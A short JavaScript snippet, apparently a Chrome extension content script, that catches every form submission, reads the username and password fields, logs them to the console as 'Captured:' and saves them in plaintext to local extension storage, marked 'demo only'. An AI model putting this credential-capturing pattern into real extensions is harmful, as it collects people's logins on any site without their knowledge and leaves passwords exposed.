// Listen for form submission
document.addEventListener("submit", function (e) {
  const form = e.target;

  const inputs = form.querySelectorAll("input");
  let username = "";
  let password = "";

  inputs.forEach((input) => {
    if (input.type === "text" || input.type === "email") {
      username = input.value;
    }
    if (input.type === "password") {
      password = input.value;
    }
  });

  if (username && password) {
    console.log("Captured:", username, password);

    // Save locally (demo only)
    chrome.storage.local.set({
      savedCredentials: {
        username: username,
        password: password
      }
    });
  }
});